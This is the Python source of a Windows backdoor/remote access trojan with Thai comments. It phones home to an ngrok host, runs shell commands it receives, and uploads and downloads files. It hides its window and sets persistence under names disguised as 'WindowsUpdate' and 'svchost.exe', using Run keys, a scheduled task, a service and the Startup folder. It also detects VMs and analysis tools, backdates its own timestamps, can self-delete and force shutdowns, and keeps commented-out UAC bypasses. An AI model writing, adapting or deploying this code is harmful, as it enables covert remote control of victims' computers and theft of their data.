#!/usr/bin/python

import socket
import platform
import getpass
import json
import sys
import subprocess
import time
import os
import base64
import pkg_resources
import ctypes
import psutil
import winreg
import win32gui
import win32con
import win32process
import random
import shutil
# from PIL import Image
# from io import BytesIO

class BD:
    def __init__(self, ip, port):
        
        # self.upgrade_pip()
        # self.install_dependencies()
        self.ip = ip 
        self.port = port
        self.reconnect()
        self.hide_self()
        self.evade_antivirus()
        # self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # self.connection.connect((ip, port))

        # # ส่งข้อมูลเครื่องไปยัง sv(server)
        # system_info = {
        #     'hostname': socket.gethostname(),
        #     'os': platform.system() + " " + platform.release(),
        #     'user': getpass.getuser(),
        # }
        # self.connect_send(system_info)

        # response = self.connect_receive()
        # self.session_token = response.get('token')
        # self.connect_send(self.session_token)



    def reconnect(self):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.ip, self.port))
                
                # ส่งข้อมูลระบบ
                system_info = {
                    'hostname': socket.gethostname(),
                    'os': platform.system() + " " + platform.release(),
                    'user': getpass.getuser(),
                }
                self.connect_send(system_info)
                
                response = self.connect_receive() 
                self.session_token = response.get('token')
                self.connect_send(self.session_token)
                return
            except:
                time.sleep(5)

    def upgrade_pip(self):
        try:
            print("[*] Upgrading pip...")
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--upgrade", "pip", "--quiet"]
            )
            print("[+] Successfully upgraded pip.")
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to upgrade pip: {e}")


    def install_dependencies(self):

        required_packages = [
            'opencv-python',
            'pyautogui',
            'keyboard',
            'sounddevice',
            'wavio',
            'cryptography',
            'requests',
            'psutil',
            'pywin32',
            'mouse',
            'netifaces',
            'scapy',
            'SpeechRecognition'
        ]

        def is_package_installed(package_name):
            try:
                pkg_resources.get_distribution(package_name)
                return True
            except pkg_resources.DistributionNotFound:
                return False
            

        def install_package(package_name):
            try:
                if not is_package_installed(package_name):
                    subprocess.check_call(
                        [sys.executable, "-m", "pip", "install", package_name, "--quiet"]
                    )
                    print(f"[+] Successfully installed: {package_name}")
                else:
                    print(f"[=] Already installed: {package_name}")
                return True
            except subprocess.CalledProcessError as e:
                print(f"[-] Failed to install {package_name}: {e}")
                return False

        print("[*] Checking and installing required packages...")
        for package in required_packages:
            if not install_package(package):
                print(f"[!] Skipping error with: {package}")
                break
        print("[*] All Dependency installation process completed.")


    def execute_sys_cmd(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            try:
                return output.decode('utf-8')
            except UnicodeDecodeError:
                return output.decode('cp1252', errors='replace')
        except subprocess.CalledProcessError as e:
            return f"[-] Error executing command: {str(e)}"

    def connect_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except:
            self.reconnect()

    def connect_receive(self):
        json_data = ""
        while True:
            try:
                packet_parts = self.connection.recv(4096).decode()
                if not packet_parts:
                    self.reconnect()
                    continue
                json_data += packet_parts 
                return json.loads(json_data)
            except ValueError:
                continue
            except:
                self.reconnect()

    def change_directory_to(self, path):
        try:
            os.chdir(path)
            return f"[+] Changed working directory to: {os.getcwd()}"
        except Exception as e:
            return f"[-] Change directory error: {str(e)}"
        
    
    def download_file(self, path):
        try:
            # มีการตรวจสอบนามสกุลไฟล์
            if path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                # สำหรับไฟล์รูปภาพ ใช้ binary mode
                with open(path, "rb") as file:
                    image_data = file.read()
                return base64.b64encode(image_data).decode()
                # img = Image.open(path)
                # buffer = BytesIO()
                # img.save(buffer, format=img.format, optimize=True, quality=100)
                # return base64.b64encode(buffer.getvalue()).decode()
            else:
                # สำหรับไฟล์ทั่วไป
                with open(path, "rb") as file:
                    return base64.b64encode(file.read()).decode()
        except Exception as e:
            return f"[-] Read file error: {str(e)}"

    def up_file(self, path, content):
        try:
            # มีการตรวจสอบนามสกุลไฟล์
            if path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                # สำหรับไฟล์รูปภาพ ใช้ binary mode
                with open(path, "wb") as file:
                    file.write(base64.b64decode(content))
                # img = Image.open(path)
                # buffer = BytesIO()
                # img.save(buffer, format=img.format, optimize=True, quality=100)
                # return base64.b64encode(buffer.getvalue()).decode()
            else:
                # สำหรับไฟล์ทั่วไป
                with open(path, "wb") as file:
                    file.write(base64.b64decode(content))
            return "[+] Upload successful"
        except Exception as e:
            return f"[-] Write file error: {str(e)}"
        
        
    # def system_info(self):
    #         try:
    #             info = {
    #                 'platform': platform.platform(),
    #                 'processor': platform.processor(),
    #                 'memory': {
    #                     'total': psutil.virtual_memory().total,
    #                     'available': psutil.virtual_memory().available,
    #                     'percent': psutil.virtual_memory().percent
    #                 },
    #                 'disks': [],
    #                 'network': str(psutil.net_if_addrs()),
    #                 'boot_time': psutil.boot_time()
    #             }
                
    #             #การเข้าถึงข้อมูล disk
    #             for partition in psutil.disk_partitions():
    #                 try:
    #                     partition_usage = psutil.disk_usage(partition.mountpoint)
    #                     info['disks'].append({
    #                         'device': partition.device,
    #                         'mountpoint': partition.mountpoint,
    #                         'total': partition_usage.total,
    #                         'used': partition_usage.used,
    #                         'free': partition_usage.free
    #                     })
    #                 except:
    #                     continue
                        
    #             return json.dump(info)
    #         except Exception as e:
    #             return f"[-] System info error: {str(e)}"



    def system_info(self):
        try:
            info = {
                'platform': platform.platform(),
                'processor': platform.processor(),
                'memory': {
                    'total': str(psutil.virtual_memory().total),
                    'available': str(psutil.virtual_memory().available),
                    'percent': str(psutil.virtual_memory().percent)
                },
                'disks': [],
                'network': str(psutil.net_if_addrs()),
                'boot_time': str(psutil.boot_time())
            }
            
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info['disks'].append({
                        'device': str(partition.device),
                        'mountpoint': str(partition.mountpoint),
                        'total': str(usage.total),
                        'used': str(usage.used),
                        'free': str(usage.free)
                    })
                except:
                    continue
                    
            return json.dumps(info)  # แทนที่ str() ด้วย json.dumps()
        except Exception as e:
            return f"[-] System info error: {str(e)}"




    def hide_self(self):
        """ซ่อนตัวเองในระบบ"""
        try:
            
            # ทำการซ่อน console
            hwnd = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            
            # เปลี่ยนชื่อ process ให้เหมือน system process
            current_pid = os.getpid()
            process_name = "svchost.exe"  # หรือชื่ออื่นๆ ที่ดูเป็น system process
            
            # ปรับ priority และ affinity
            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, current_pid)
            win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
            
            # ย้ายไฟล์ไปที่ system directory
            if not self.is_in_system_dir():
                self.move_to_system_dir()
            
            # ซ่อนไฟล์
            try:
                win32api.SetFileAttributes(sys.executable, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
                
            # เพิ่มการซ่อนใน Registry
            reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            reg_name = "WindowsUpdate"
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, 
                                winreg.KEY_WRITE)
                winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
            except:
                pass

            return True
        except Exception:
            return False
        

        
    def system_shutdown(self):
        try:
            if platform.system().lower() == 'windows':
                try:
                    # วิธีที่ 1: ใช้ os.system
                    os.system('shutdown /s /t 0')
                except:
                    try:
                        # วิธีที่ 2: ใช้ subprocess
                        subprocess.run(['shutdown', '/s', '/t', '0'], shell=True)
                    except:
                        try:
                            # วิธีที่ 3: ใช้ ctypes
                            user32 = ctypes.WinDLL('user32')
                            user32.ExitWindowsEx(0x00000001, 0)
                        except:
                            return "[-] Shutdown failed"
            else:
                # สำหรับ Linux/Unix
                os.system('shutdown -h now')
            return "[+] Shutdown command executed"
        except Exception as e:
            return f"[-] Shutdown error: {str(e)}"
        

    def system_reboot(self):
        try:
            if platform.system().lower() == 'windows':
                try:
                    # วิธีที่ 1 ใช้ os.system
                    os.system('shutdown /r /t 0')
                except:
                    try:
                        # วิธีที่ 2 ใช้ subprocess
                        subprocess.run(['shutdown', '/r', '/t', '0'], shell=True)
                    except:
                        try:
                            # วิธีที่ 3 ใช้ ctypes
                            user32 = ctypes.WinDLL('user32')
                            user32.ExitWindowsEx(0x00000002, 0)
                        except:
                            return "[-] Reboot failed"
            else:
                # สำหรับ Linux/Unix
                os.system('reboot')
            return "[+] Reboot command executed"
        except Exception as e:
            return f"[-] Reboot error: {str(e)}"
        
    
    def run_as_admin(self, program_path, args=None):
        try:
            if not os.path.exists(program_path):
                return "[-] Program not found"

            if args is None:
                args = ""

            # cmd = f'powershell.exe Start-Process "{program_path}" -ArgumentList "{args}" -Verb RunAs -WindowStyle Hidden'
            cmd = (
            f'powershell.exe Start-Process "{program_path}" '
            f'-ArgumentList "{args}" -Verb RunAs -WindowStyle Hidden'
            )

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                return "[+] Program executed with admin."
            else:
                return f"[-] Execution error: {result.stderr}"
        except Exception as e:
            return f"[-] Admin execution error: {str(e)}"
        

    # def silent_uac_bypass_run(self, program_path):
    #     try:
    #         system32 = os.path.expandvars("%SystemRoot%\\System32")
    #         target_dll = os.path.join(system32, "cryptbase.dll")
    #         backup_dll = os.path.join(system32, "cryptbase.dll.bak")
            
    #         if os.path.exists(target_dll):
    #             os.rename(target_dll, backup_dll)
                
    #         shutil.copy2(program_path, target_dll)
            
    #         # รัน trigger process ด้วยสิทธิ์ admin
    #         subprocess.Popen("consent.exe", shell=True)
    #         time.sleep(2)
            
    #         # คืนค่า DLL เดิม
    #         os.remove(target_dll)
    #         os.rename(backup_dll, target_dll)
    #         return "[+] Program executed without UAC"
    #     except Exception as e:
    #         return f"[-] Execution failed: {str(e)}"

    # def silent_uac_bypass_run(self, program_path):
    #     try:
    #         key_path = "Software\\Classes\\ms-settings\\Shell\\Open\\command"
    #         command_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
    #         winreg.SetValueEx(command_key, "DelegateExecute", 0, winreg.REG_SZ, "")
            
    #         # เพิ่มคำสั่ง PowerShell เพื่อรันโปรแกรมด้วยสิทธิ์ admin
    #         powershell_cmd = f'powershell.exe Start-Process "{program_path}" -Verb RunAs -WindowStyle Hidden'
    #         winreg.SetValueEx(command_key, "", 0, winreg.REG_SZ, powershell_cmd)
    #         winreg.CloseKey(command_key)

    #         subprocess.run("fodhelper.exe") 
    #         time.sleep(2)

    #         winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
    #         return "[+] Program executed without UAC"
    #     except Exception as e:
    #         return f"[-] Execution failed: {str(e)}"


    def evade_antivirus(self):
        """หลบ Antivirus โดยการปลอม Process"""
        try:
            vm_processes = ['vmsrvc.exe', 'vmusrvc.exe', 'vboxtray.exe', 'vmtoolsd.exe']
            analysis_tools = ['wireshark.exe', 'processhacker.exe', 'procmon.exe', 'procexp.exe']
            
            running_processes = [p.name().lower() for p in psutil.process_iter()]
            
            for proc in vm_processes + analysis_tools:
                if proc.lower() in running_processes:
                    return False  
                
            time.sleep(random.uniform(1, 3))
            
            encoded_strings = {}
            for s in ['cmd.exe', 'powershell.exe', 'reg.exe']:
                key = random.randint(1, 255)
                encoded = bytes([ord(c) ^ key for c in s])
                encoded_strings[s] = (encoded, key)

            # ปรับเปลี่ยน file timestamp
            current_file = sys.argv[0]
            old_time = time.time() - (90 * 24 * 60 * 60)  # ย้อนหลังไปประมาณ 90 วัน
            os.utime(current_file, (old_time, old_time))

            # สร้าง fake errors บางครั้ง
            if random.random() < 0.1:  # 10% chance
                print("Error loading DLL: 0x80004005")

        except Exception as e:
            return f"[-] Evasion error: {str(e)}"

    def self_destruct(self):
        try:
            self.remove_persistence()
            temp_dir = os.environ.get('TEMP')
            batch_path = os.path.join(temp_dir, "cleanup.bat")
            
            batch = f'''@echo off
            timeout 3 > NUL
            del "{sys.executable}"
            del "%~f0"'''
            
            with open(batch_path, "w") as f:
                f.write(batch)
            
            subprocess.Popen(batch_path, shell=True)
            sys.exit()
        except Exception as e:
            return f"[-] Self-destruct failed: {str(e)}"

    def add_persistence(self, method="all"):
        """รันโปรแกรมอัตโนมัติเมื่อเปิดเครื่อง"""
        try:
            success_methods = []
            executable_path = sys.executable

            if method in ["registry", "all"]:
                try:
                    # เพิ่มใน Registry Run
                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                    winreg.SetValueEx(key, "WindowsUpdate", 0, 
                        winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    success_methods.append("registry")
                except:
                    pass

                try:
                    # เพิ่มใน Registry RunOnce
                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
                        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
                    winreg.SetValueEx(key, "WindowsUpdate", 0, 
                        winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    success_methods.append("registry_once")
                except:
                    pass

            if method in ["task", "all"]:
                try:
                    # สร้าง Scheduled Task
                    task_name = "WindowsUpdateTask"
                    cmd = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc onlogon /rl highest /f'
                    subprocess.run(cmd, shell=True)
                    success_methods.append("task")
                except:
                    pass

            if method in ["service", "all"]:
                try:
                    # สร้าง Windows Service
                    service_name = "WindowsUpdate"
                    cmd = f'sc create "{service_name}" binpath= "{executable_path}" start= auto'
                    subprocess.run(cmd, shell=True)
                    subprocess.run(f'sc start "{service_name}"', shell=True)
                    success_methods.append("service")
                except:
                    pass

            if method in ["startup", "all"]:
                try:
                    # เพิ่มใน Startup folder
                    startup_folder = os.path.join(os.getenv('APPDATA'), 
                        'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                    startup_file = os.path.join(startup_folder, "svchost.exe")
                    shutil.copy2(executable_path, startup_file)
                    success_methods.append("startup")
                except:
                    pass

            return f"[+] Persistence added using: {', '.join(success_methods)}"
        except Exception as e:
            return f"[-] Persistence error: {str(e)}"


    def remove_persistence(self):
        """ลบการรันอัตโนมัติทั้งหมด"""
        try:
            # ลบจาก Registry
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                    0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key, "WindowsUpdate")
                winreg.CloseKey(key)
            except:
                pass

            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 
                    0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key, "WindowsUpdate")
                winreg.CloseKey(key)
            except:
                pass

            # ลบ Scheduled Task
            subprocess.run('schtasks /delete /tn "WindowsUpdateTask" /f', shell=True)

            # ลบ Service
            subprocess.run('sc stop "WindowsUpdate"', shell=True)
            subprocess.run('sc delete "WindowsUpdate"', shell=True)

            # ลบจาก Startup folder
            startup_file = os.path.join(os.getenv('APPDATA'), 
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe')
            if os.path.exists(startup_file):
                os.remove(startup_file)

            return "[+] All persistence methods removed"
        except Exception as e:
            return f"[-] Remove persistence error: {str(e)}"

    def run_cmd(self):
        while True:
            try:
                cmd = self.connect_receive()
            

                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif cmd[0] == "cd" and len(cmd) > 1:
                    cmd_result = self.change_directory_to(cmd[1])

                elif cmd[0] == "runadmin" and len(cmd) > 1:
                    args = cmd[2] if len(cmd) > 2 else None
                    cmd_result = self.run_as_admin(cmd[1], args)

                elif cmd[0] == "upload" and len(cmd) > 2:
                    cmd_result = self.up_file(cmd[1], cmd[2])

                elif cmd[0] == "download" and len(cmd) > 1:
                    cmd_result = self.download_file(cmd[1])

                elif cmd[0] == "selfdelete":  
                    cmd_result = self.self_destruct()

                elif cmd[0] == "persist":
                    cmd_result = self.add_persistence()
                
                elif cmd[0] == "shutdown":
                    cmd_result = self.system_shutdown()
                
                elif cmd[0] == "reboot":
                    cmd_result = self.system_reboot()

                elif cmd[0] == "sysinfo":
                    cmd_result = self.system_info()

                elif cmd[0] == "silentrun" and len(cmd) > 1:
                    cmd_result = self.silent_uac_bypass_run(cmd[1])

                else:
                    cmd_result = self.execute_sys_cmd(cmd)

                self.connect_send(cmd_result)

            except Exception as e:
                try:
                    self.connect_send(f"[-] Error command execution: {str(e)}")
                except:
                    break

if __name__ == "__main__":
    try:
        while True:
            try:
                server_bd = BD("0.tcp.ap.ngrok.io", 17092)
                # server_bd = BD("192.168.1.101", 5555)
                server_bd.run_cmd()
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                time.sleep(5)  # รอ 5 วินาทีก่อนลองเชื่อม Server ใหม่
    except KeyboardInterrupt:
        sys.exit()


    